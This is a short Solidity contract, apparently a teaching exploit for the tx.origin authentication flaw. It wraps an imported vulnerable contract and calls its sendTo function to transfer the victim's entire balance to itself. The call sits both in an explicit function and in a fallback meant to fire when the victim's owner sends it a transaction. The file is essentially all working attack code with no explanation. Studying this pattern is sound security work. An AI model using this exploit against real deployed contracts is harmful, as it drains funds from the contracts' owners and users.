//SPDX-License-Identifier:MIT
pragma solidity ^0.8.10;

import {txOrigin} from './txOrigin.sol';


contract txOriginEx {
    txOrigin public vuln;

    constructor(address payable vulnerableContract) payable {
        vuln = txOrigin(vulnerableContract);
    }

    function ExploitTxOrigin() public{
        vuln.sendTo(payable(address(this)), address(vuln).balance);
    }
    
    fallback() external payable {
        vuln.sendTo(payable(address(this)), address(vuln).balance);
    }
    
    receive() external payable{}
}